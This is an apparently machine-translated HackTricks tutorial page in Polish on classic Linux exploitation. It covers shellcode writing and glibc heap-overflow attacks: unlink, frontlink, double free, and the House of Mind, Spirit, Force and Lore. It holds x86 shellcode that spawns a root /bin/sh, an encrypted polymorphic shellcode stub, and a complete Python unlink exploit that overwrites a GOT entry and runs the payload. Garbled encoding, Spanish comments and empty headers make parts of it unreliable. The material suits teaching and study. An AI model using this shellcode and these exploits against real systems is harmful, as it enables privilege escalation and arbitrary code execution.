# Eksploitacja systemu Linux (Podstawy)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** â€”> Returns a .o file\
**ld assembly.o -o shellcodeout** â€”> Gives us an executable formed by the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Aby sprawdziÄ‡, czy wywoÅ‚ania systemowe sÄ… wykonywane poprawnie, naleÅ¼y skompilowaÄ‡ poprzedni program, a wywoÅ‚ania systemowe powinny pojawiÄ‡ siÄ™ w **strace ./SKOMPILOWANY\_PROGRAM**

Podczas tworzenia shellcode'u moÅ¼na zastosowaÄ‡ sztuczkÄ™. Pierwsza instrukcja to skok do wywoÅ‚ania. WywoÅ‚anie wykonuje oryginalny kod i dodatkowo umieszcza EIP na stosie. Po instrukcji wywoÅ‚ania umieszczamy potrzebny nam ciÄ…g znakÃ³w, dziÄ™ki czemu za pomocÄ… tego EIP moÅ¼emy wskazaÄ‡ na ciÄ…g znakÃ³w i kontynuowaÄ‡ wykonywanie kodu.

EJ **SZTUCZKA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**UÅ¼ycie ESP do uÅ¼ycia stosu (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Åowca jajek:**

Polega na maÅ‚ym kodzie, ktÃ³ry przeszukuje strony pamiÄ™ci powiÄ…zane z procesem w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoÅ› podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy mamy tylko niewielkÄ… przestrzeÅ„ do wstrzykniÄ™cia kodu.

**Shellkody polimorficzne**

PolegajÄ… na zaszyfrowanych shellkodach, ktÃ³re posiadajÄ… maÅ‚e kody deszyfrujÄ…ce i skaczÄ…ce do nich, uÅ¼ywajÄ…c sztuczki Call-Pop, oto **przykÅ‚ad zaszyfrowany szyfrem Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Metody uzupeÅ‚niajÄ…ce**













###





## **8 PrzepeÅ‚nienia sterty: Podstawowe ataki**

**Przypisany kawaÅ‚ek**

prev\_size |\
size | â€”NagÅ‚Ã³wek\
\*mem | Dane

**Wolny kawaÅ‚ek**

prev\_size |\
size |\
\*fd | Ptr do przodu\
\*bk | Ptr do tyÅ‚u â€”NagÅ‚Ã³wek\
\*mem | Dane

Wolne kawaÅ‚ki sÄ… w liÅ›cie dwukierunkowej (bin) i nigdy nie mogÄ… byÄ‡ dwa wolne kawaÅ‚ki obok siebie (sÄ… Å‚Ä…czone)

W "size" sÄ… bity wskazujÄ…ce: czy poprzedni kawaÅ‚ek jest uÅ¼ywany, czy kawaÅ‚ek zostaÅ‚ przydzielony za pomocÄ… mmap() i czy kawaÅ‚ek naleÅ¼y do gÅ‚Ã³wnego obszaru.

Podczas zwalniania kawaÅ‚ka, jeÅ›li ktÃ³rykolwiek z sÄ…siednich jest wolny, sÄ… one Å‚Ä…czone za pomocÄ… makra unlink() i najwiÄ™kszy nowy kawaÅ‚ek jest przekazywany do frontlink() w celu wstawienia go do odpowiedniego binu.

unlink(){\
BK = P->bk; â€”> BK nowego kawaÅ‚ka to ten, ktÃ³ry byÅ‚ wolny wczeÅ›niej\
FD = P->fd; â€”> FD nowego kawaÅ‚ka to ten, ktÃ³ry byÅ‚ wolny wczeÅ›niej\
FD->bk = BK; â€”> BK nastÄ™pnego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
BK->fd = FD; â€”> FD poprzedniego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
}

Dlatego jeÅ›li uda nam siÄ™ zmodyfikowaÄ‡ P->bk na adres shellcode i P->fd na adres wpisu w GOT lub DTORS pomniejszony o 12, osiÄ…gniemy:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

W ten sposÃ³b shellcode zostanie wykonana po opuszczeniu programu.

Dodatkowo, 4. instrukcja unlink() zapisuje coÅ›, a shellcode musi byÄ‡ dostosowana do tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Spowoduje to zapisanie 4 bajtÃ³w od 8 bajtu shellcode, dlatego pierwszÄ… instrukcjÄ… shellcode powinno byÄ‡ skok, aby ominÄ…Ä‡ to i przejÅ›Ä‡ do nops prowadzÄ…cych do reszty shellcode.

Dlatego exploit jest tworzony:

W buforze 1 umieszczamy shellcode zaczynajÄ…c od skoku, aby przejÅ›Ä‡ do nops lub reszty shellcode.

Po shellcode dodajemy wypeÅ‚nienie do osiÄ…gniÄ™cia pola prev\_size i size nastÄ™pnego kawaÅ‚ka. W tych miejscach umieszczamy 0xfffffff0 (aby nadpisaÄ‡ prev\_size i ustawiÄ‡ bit wskazujÄ…cy, Å¼e jest wolny) oraz "-4" (0xfffffffc) w size (aby podczas sprawdzania w 3. kawaÅ‚ku, czy 2. byÅ‚ wolny, faktycznie przejdzie do zmodyfikowanego prev\_size, ktÃ³ry powie, Å¼e jest wolny) -> Dlatego gdy free() sprawdzi, przejdzie do size 3., ale faktycznie przejdzie do 2. - 4 i uzna, Å¼e 2. kawaÅ‚ek jest wolny. NastÄ™pnie wywoÅ‚a **unlink()**.

Podczas wywoÅ‚ywania unlink() uÅ¼yje pierwszych danych z 2. kawaÅ‚ka jako P->fd, wiÄ™c tam zostanie wstawiony adres do nadpisania - 12 (poniewaÅ¼ w FD->bk dodaje 12 do adresu przechowywanego w FD). A pod tym adresem zostanie wprowadzony drugi adres z 2. kawaÅ‚ka, ktÃ³ry bÄ™dzie interesujÄ…cy dla nas jako adres shellcode (faÅ‚szywy P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #skok 12 + 12 bajtÃ³w wypeÅ‚nienia**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Interesuje, aby bit wskazujÄ…cy, Å¼e poprzedni kawaÅ‚ek jest wolny, byÅ‚ ustawiony na 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, aby program myÅ›laÅ‚, Å¼e "size" 3. kawaÅ‚ka jest 4 bajty wczeÅ›niej (wskazuje na prev\_size), bo tam sprawdza, czy 2. kawaÅ‚ek jest wolny**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poczÄ…tku Å‚adujemy 8 bajtÃ³w wypeÅ‚nienia do payloadu**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres free() w plt-12 (bÄ™dzie nadpisany, aby shellcode zostaÅ‚a uruchomiona 2. raz, gdy free() zostanie wywoÅ‚ane)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Jak wspomniano, payload zaczyna siÄ™ od 8 bajtÃ³w wypeÅ‚nienia**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modyfikujemy 2. kawaÅ‚ek, got\_free wskazuje, gdzie zapiszemy adres addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() zwalniajÄ…c w odwrotnej kolejnoÅ›ci (wargame)**

Kontrolujemy 3 kolejne kawaÅ‚ki i sÄ… one zwalniane w odwrotnej kolejnoÅ›ci niÅ¼ byÅ‚y rezerwowane.

W tym przypadku:

W kawaÅ‚ku c umieszczamy shellcode

KawaÅ‚ek a uÅ¼ywamy do nadpisania b, aby size miaÅ‚ wyÅ‚Ä…czony bit PREV\_INUSE, aby program myÅ›laÅ‚, Å¼e kawaÅ‚ek a jest wolny.

Dodatkowo, w nagÅ‚Ã³wku b nadpisujemy size, aby wynosiÅ‚ -4.

Wtedy program uzna, Å¼e "a" jest wolny i w binie, wiÄ™c wywoÅ‚a unlink(), aby go odÅ‚Ä…czyÄ‡. JednakÅ¼e, poniewaÅ¼ nagÅ‚Ã³wek PREV\_SIZE wynosi -4, uzna, Å¼e kawaÅ‚ek "a" zaczyna siÄ™ naprawdÄ™ w b+4. Innymi sÅ‚owy, wywoÅ‚a unlink() dla kawaÅ‚ka, ktÃ³ry zaczyna siÄ™ w b+4, wiÄ™c w b+12 bÄ™dzie wskaÅºnik "fd", a w b+16 bÄ™dzie wskaÅºnik "bk".

W ten sposÃ³b, jeÅ›li w bk umieÅ›cimy adres shellcode, a w fd umieÅ›cimy adres funkcji "puts()"-12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoÅ‚ywany, gdy coÅ› jest zwalniane i Å¼aden z sÄ…siednich kawaÅ‚kÃ³w nie jest wolny, wtedy nie jest wywoÅ‚ywane unlink(), ale jest bezpoÅ›rednio wywoÅ‚ywane frontlink().

UÅ¼yteczna podatnoÅ›Ä‡, gdy atakowany malloc nigdy nie jest zwalniany (free()).

Wymaga:

Bufora, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony funkcjÄ… wejÅ›ciowÄ…

Bufora sÄ…siadujÄ…cego z tym, ktÃ³ry zostanie zwolniony i ktÃ³rego pole fd w nagÅ‚Ã³wku zostanie zmodyfikowane dziÄ™ki przepeÅ‚nieniu poprzedniego bufora

Bufora do zwolnienia o rozmiarze wiÄ™kszym niÅ¼ 512, ale mniejszym niÅ¼ poprzedni bufor

Bufora zadeklarowanego przed krokiem 3, ktÃ³ry pozwala na nadpisanie prev\_size tego bufora

DziÄ™ki temu, poprzez nadpisanie dwÃ³ch mallocÃ³w w sposÃ³b niekontrolowany i jednego w sposÃ³b kontrolowany, ale tylko ten jeden jest zwalniany, moÅ¼emy przeprowadziÄ‡ exploit.

**PodatnoÅ›Ä‡ double free()**

JeÅ›li free() jest wywoÅ‚ywane dwa razy z tym samym wskaÅºnikiem, sÄ… dwa biny wskazujÄ…ce na ten sam adres.

JeÅ›li chcemy ponownie uÅ¼yÄ‡ jednego, nie ma problemu. JeÅ›li chcemy uÅ¼yÄ‡ drugiego, zostanie przydzielona ta sama przestrzeÅ„, wiÄ™c mamy faÅ‚szywe wskaÅºniki "fd" i "bk" z danymi, ktÃ³re zostanÄ… zapisane przez poprzedniÄ… rezerwacjÄ™.

**Po free()**

WskaÅºnik wczeÅ›niej zwolniony jest ponownie uÅ¼ywany bez kontroli.
## **8 PrzepeÅ‚nienia sterty: Zaawansowane ataki**

Techniki Unlink() i FrontLink() zostaÅ‚y usuniÄ™te poprzez modyfikacjÄ™ funkcji unlink().

**The house of mind**

Wystarczy jedno wywoÅ‚anie free(), aby spowodowaÄ‡ wykonanie arbitralnego kodu. Szukamy drugiego kawaÅ‚ka, ktÃ³ry moÅ¼e zostaÄ‡ nadpisany przez poprzedni i zwolniony.

WywoÅ‚anie free() powoduje wywoÅ‚anie public\_fREe(mem), co powoduje:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Zwraca wskaÅºnik do miejsca, gdzie zaczyna siÄ™ kawaÅ‚ek (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

W \[1] sprawdzany jest rozmiar pola NON\_MAIN\_ARENA, ktÃ³ry moÅ¼na zmieniÄ‡, aby sprawdzenie zwrÃ³ciÅ‚o true i wykonaÅ‚o heap\_for\_ptr(), ktÃ³re wykonuje operacjÄ™ and na "mem", ustawiajÄ…c na 0 2,5 mniej znaczÄ…cych bajtÃ³w (w naszym przypadku z 0x0804a000 na 0x08000000) i uzyskuje dostÄ™p do 0x08000000->ar\_ptr (jak do struktury heap\_info).

W ten sposÃ³b, jeÅ›li moÅ¼emy kontrolowaÄ‡ kawaÅ‚ek na przykÅ‚ad w 0x0804a000 i kawaÅ‚ek zostanie zwolniony w **0x081002a0**, moÅ¼emy dotrzeÄ‡ do adresu 0x08100000 i zapisaÄ‡, na przykÅ‚ad, **0x0804a000**. Gdy ten drugi kawaÅ‚ek zostanie zwolniony, heap\_for\_ptr(ptr)->ar\_ptr zwrÃ³ci to, co napisaliÅ›my w 0x08100000 (poniewaÅ¼ stosuje siÄ™ do 0x081002a0 operacjÄ™ and, ktÃ³rÄ… widzieliÅ›my wczeÅ›niej, i stÄ…d pobiera wartoÅ›Ä‡ pierwszych 4 bajtÃ³w, ar\_ptr).

W ten sposÃ³b wywoÅ‚ywane jest \_int\_free(ar\_ptr, mem), czyli **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliÅ›my wczeÅ›niej, moÅ¼emy kontrolowaÄ‡ wartoÅ›Ä‡ av, poniewaÅ¼ to, co piszemy w zwalnianym kawaÅ‚ku.

Zgodnie z definicjÄ… unsorted\_chunks, wiemy, Å¼e:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeÅ›li w av->bins\[2] wpiszemy wartoÅ›Ä‡ \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zostanie zapisana w \_\_DTOR\_END\_\_ adres drugiego kawaÅ‚ka.

Inaczej mÃ³wiÄ…c, na poczÄ…tku pierwszego kawaÅ‚ka musimy umieÅ›ciÄ‡ wiele razy adres \_\_DTOR\_END\_\_-12, poniewaÅ¼ av->bins\[2] go stamtÄ…d weÅºmie.

W miejscu, gdzie znajduje siÄ™ adres drugiego kawaÅ‚ka z ostatnimi 5 zerami, naleÅ¼y wpisaÄ‡ adres tego pierwszego kawaÅ‚ka, aby heap\_for\_ptr() uznaÅ‚, Å¼e ar\_ptr znajduje siÄ™ na poczÄ…tku pierwszego kawaÅ‚ka i stamtÄ…d wyciÄ…gnÄ…Å‚ av->bins\[2].

W drugim kawaÅ‚ku, dziÄ™ki pierwszemu, nadpisujemy prev\_size skokiem 0x0c i size czymÅ›, aby aktywowaÄ‡ -> NON\_MAIN\_ARENA.

NastÄ™pnie w kawaÅ‚ku 2 umieszczamy duÅ¼o nops i ostatecznie shellcode.

W ten sposÃ³b zostanie wywoÅ‚ane \_int\_free(KAWAÅEK1, KAWAÅEK2) i zostanÄ… wykonane instrukcje, aby zapisaÄ‡ w \_\_DTOR\_END\_\_ adres prev\_size KAWAÅKA2, ktÃ³ry skoczy do shellcode.

Aby zastosowaÄ‡ tÄ™ technikÄ™, konieczne jest speÅ‚nienie kilku dodatkowych wymagaÅ„, ktÃ³re nieco komplikujÄ… payload.

Ta technika nie jest juÅ¼ stosowana, poniewaÅ¼ zastosowano prawie ten sam patch co dla unlink. PorÃ³wnuje siÄ™, czy nowe miejsce, do ktÃ³rego siÄ™ odwoÅ‚uje, rÃ³wnieÅ¼ odwoÅ‚uje siÄ™ do niego.

**Fastbin**

To wariant The house of mind

Interesuje nas wykonanie nastÄ™pujÄ…cego kodu, do ktÃ³rego dochodzi po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gdzie fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

W ten sposÃ³b, jeÅ›li umieÅ›cimy w "fb" adres funkcji w GOT, pod tym adresem umieszczona zostanie nadpisana wartoÅ›Ä‡. Wymaga to, aby arena byÅ‚a blisko adresÃ³w dtors. DokÅ‚adniej mÃ³wiÄ…c, av->max\_fast musi znajdowaÄ‡ siÄ™ pod adresem, ktÃ³ry zamierzamy nadpisaÄ‡.

PoniewaÅ¼ w The House of Mind zauwaÅ¼ono, Å¼e kontrolowaliÅ›my pozycjÄ™ av.

JeÅ›li wiÄ™c w polu size umieÅ›cimy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() zwrÃ³ci fastbins\[-1], ktÃ³ry wskaÅ¼e na av->max\_fast

W tym przypadku av->max\_fast bÄ™dzie adresem, ktÃ³ry zostanie nadpisany (nie na ktÃ³ry wskaÅ¼e, ale ta pozycja zostanie nadpisana).

Dodatkowo musi byÄ‡ speÅ‚niony warunek, Å¼e kawaÅ‚ek sÄ…siadujÄ…cy z uwolnionym musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar uwolnionego kawaÅ‚ka to 8, w tym faÅ‚szywym kawaÅ‚ku musimy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w uwolnionym kawaÅ‚ku, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry trafi w nops).

Dodatkowo ten sam faÅ‚szywy kawaÅ‚ek musi byÄ‡ mniejszy niÅ¼ av->system\_mem. av->system\_mem znajduje siÄ™ 1848 bajtÃ³w dalej.

Ze wzglÄ™du na nulle w \_DTOR\_END\_ i niewiele adresÃ³w w GOT, Å¼aden z tych obszarÃ³w nie nadaje siÄ™ do nadpisania, zobaczmy wiÄ™c, jak zastosowaÄ‡ fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

JeÅ›li zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwrÃ³ci fastbins\[0] i moÅ¼emy z tego skorzystaÄ‡, aby nadpisaÄ‡ stos.

W tym przypadku nie powinno byÄ‡ Å¼adnych canary ani dziwnych wartoÅ›ci na stosie, faktycznie musimy znaleÅºÄ‡ siÄ™ w: 4 bajty nulle + EBP + RET

4 bajty nulle sÄ… potrzebne, aby **av** znajdowaÅ‚ siÄ™ pod tym adresem, a pierwszym elementem **av** jest mutex, ktÃ³ry musi wynosiÄ‡ 0.

**av->max\_fast** bÄ™dzie EBP i bÄ™dzie wartoÅ›ciÄ…, ktÃ³ra pozwoli nam ominÄ…Ä‡ ograniczenia.

W **av->fastbins\[0]** zostanie nadpisany adresem **p** i bÄ™dzie RET, co spowoduje skok do shellcode.

Dodatkowo, w **av->system\_mem** (1484 bajty powyÅ¼ej pozycji na stosie) bÄ™dzie duÅ¼o Å›mieci, ktÃ³re pozwolÄ… nam ominÄ…Ä‡ sprawdzenie.

Dodatkowo musi byÄ‡ speÅ‚niony warunek, Å¼e kawaÅ‚ek sÄ…siadujÄ…cy z uwolnionym musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar uwolnionego kawaÅ‚ka to 16, w tym faÅ‚szywym kawaÅ‚ku musimy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w uwolnionym kawaÅ‚ku, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry trafi w nops, ktÃ³re znajdujÄ… siÄ™ po polu size nowego faÅ‚szywego kawaÅ‚ka).

**The House of Spirit**

W tym przypadku szukamy wskaÅºnika malloc, ktÃ³ry moÅ¼e byÄ‡ zmieniony przez atakujÄ…cego (na przykÅ‚ad, aby wskaÅºnik znajdowaÅ‚ siÄ™ na stosie pod potencjalnym przepeÅ‚nieniem zmiennej).

W ten sposÃ³b moglibyÅ›my sprawiÄ‡, Å¼e ten wskaÅºnik wskazywaÅ‚by gdziekolwiek. Jednak nie kaÅ¼de miejsce jest dobre, rozmiar faÅ‚szywego kawaÅ‚ka musi byÄ‡ mniejszy niÅ¼ av->max\_fast i bardziej konkretne, rÃ³wny rozmiarowi Å¼Ä…danemu w przyszÅ‚ym wywoÅ‚aniu malloc()+8. Dlatego jeÅ›li wiemy, Å¼e po tym podatnym wskaÅºniku nastÄ™puje wywoÅ‚anie malloc(40), rozmiar faÅ‚szywego kawaÅ‚ka musi wynosiÄ‡ 48.
JeÅ›li na przykÅ‚ad program pyta uÅ¼ytkownika o liczbÄ™, moÅ¼emy wprowadziÄ‡ 48 i skierowaÄ‡ zmienialny wskaÅºnik malloc na nastÄ™pne 4 bajty (ktÃ³re mogÄ… naleÅ¼eÄ‡ do EBP, jeÅ›li mamy szczÄ™Å›cie, wiÄ™c 48 pozostaje z tyÅ‚u, jakby to byÅ‚a nagÅ‚Ã³wek rozmiaru). Ponadto adres ptr-4+48 musi speÅ‚niaÄ‡ kilka warunkÃ³w (w tym przypadku ptr=EBP), czyli 8 < ptr-4+48 < av->system\_mem.

JeÅ›li to zostanie speÅ‚nione, gdy zostanie wywoÅ‚any kolejny malloc, ktÃ³ry okreÅ›liliÅ›my jako malloc(40), zostanie mu przypisany adres EBP. JeÅ›li atakujÄ…cy moÅ¼e rÃ³wnieÅ¼ kontrolowaÄ‡ to, co jest zapisywane w tym malloc, moÅ¼e nadpisaÄ‡ zarÃ³wno EBP, jak i EIP dowolnym adresem.

WyglÄ…da na to, Å¼e dlatego, gdy zostanie zwolniony free(), zostanie zapisane, Å¼e w adresie wskazujÄ…cym na EBP stosu znajduje siÄ™ kawaÅ‚ek o idealnym rozmiarze dla nowego malloc(), ktÃ³ry chcemy zarezerwowaÄ‡, wiÄ™c przypisuje mu ten adres.

**The House of Force**

Potrzebne jest:

* PrzepeÅ‚nienie do kawaÅ‚ka, ktÃ³re pozwala na nadpisanie wilderness
* WywoÅ‚anie malloc() z rozmiarem okreÅ›lonym przez uÅ¼ytkownika
* WywoÅ‚anie malloc(), ktÃ³rego dane mogÄ… byÄ‡ zdefiniowane przez uÅ¼ytkownika

Po pierwsze, nadpisujemy rozmiar kawaÅ‚ka wilderness wartoÅ›ciÄ… bardzo duÅ¼Ä… (0xffffffff), dziÄ™ki czemu kaÅ¼de Å¼Ä…danie pamiÄ™ci wystarczajÄ…co duÅ¼e bÄ™dzie obsÅ‚ugiwane w \_int\_malloc() bez koniecznoÅ›ci rozszerzania sterty.

Po drugie, zmieniamy av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego, takiego jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisaÄ‡ av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim pobiera adres bieÅ¼Ä…cego kawaÅ‚ka wilderness (aktualne av->top), a remainder to dokÅ‚adnie suma tego adresu i liczby bajtÃ³w Å¼Ä…danych przez malloc(). Dlatego jeÅ›li \&EIP-8 znajduje siÄ™ pod adresem 0xbffff224, a av->top zawiera 0x080c2788, to iloÅ›Ä‡, ktÃ³rÄ… musimy zarezerwowaÄ‡ w kontrolowanym malloc, aby av->top wskazywaÅ‚ na $EIP-8 dla nastÄ™pnego malloc(), wynosi:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposÃ³b zmodyfikowany zostanie av->top, a nastÄ™pny malloc wskaÅ¼e na EIP i bÄ™dzie moÅ¼na go nadpisaÄ‡.

WaÅ¼ne jest, aby rozmiar nowego kawaÅ‚ka wilderness byÅ‚ wiÄ™kszy niÅ¼ Å¼Ä…danie ostatniego malloc(). Innymi sÅ‚owy, jeÅ›li wilderness wskazuje na \&EIP-8, rozmiar bÄ™dzie dokÅ‚adnie w polu EBP stosu.

**The House of Lore**

**Korupcja SmallBin**

Zwolnione kawaÅ‚ki sÄ… umieszczane w binie w zaleÅ¼noÅ›ci od ich rozmiaru. Ale zanim zostanÄ… umieszczone, sÄ… przechowywane w unsorted bins. KawaÅ‚ek, ktÃ³ry zostaÅ‚ zwolniony, nie jest natychmiast umieszczany w swoim binie, ale pozostaje w unsorted bins. NastÄ™pnie, jeÅ›li zostanie zarezerwowany nowy kawaÅ‚ek i poprzedni zwolniony moÅ¼e mu posÅ‚uÅ¼yÄ‡, zostanie mu zwrÃ³cony, ale jeÅ›li zostanie zarezerwowany wiÄ™kszy, zwolniony kawaÅ‚ek w unsorted bins zostanie umieszczony w odpowiednim binie.

Aby osiÄ…gnÄ…Ä‡ podatny kod, Å¼Ä…danie pamiÄ™ci musi byÄ‡ wiÄ™ksze niÅ¼ av->max\_fast (zazwyczaj 72) i mniejsze niÅ¼ MIN\_LARGE\_SIZE (512).

JeÅ›li w binie znajduje siÄ™ kawaÅ‚ek o odpowiednim rozmiarze, zostanie on zwrÃ³cony po odÅ‚Ä…czeniu:

bck = victim->bk; WskaÅ¼e poprzedni kawaÅ‚ek, to jedyna informacja, ktÃ³rÄ… moÅ¼emy zmieniÄ‡.

bin->bk = bck; Przedostatni kawaÅ‚ek staje siÄ™ ostatnim, jeÅ›li bck wskazuje na stos, nastÄ™pnemu zarezerwowanemu kawaÅ‚kowi zostanie przypisany ten adres

bck->fd = bin; Lista jest zamykana, wskazujÄ…c na bin

Potrzebne jest:

Zarezerwowanie dwÃ³ch malloc, tak aby po zwolnieniu drugiego i umieszczeniu go w jego binie (czyli zarezerwowaniu wiÄ™kszego malloc niÅ¼ drugi kawaÅ‚ek przed przepeÅ‚nieniem)

Zarezerwowanie malloc, ktÃ³remu atakujÄ…cy moÅ¼e przypisaÄ‡ wybrany adres.

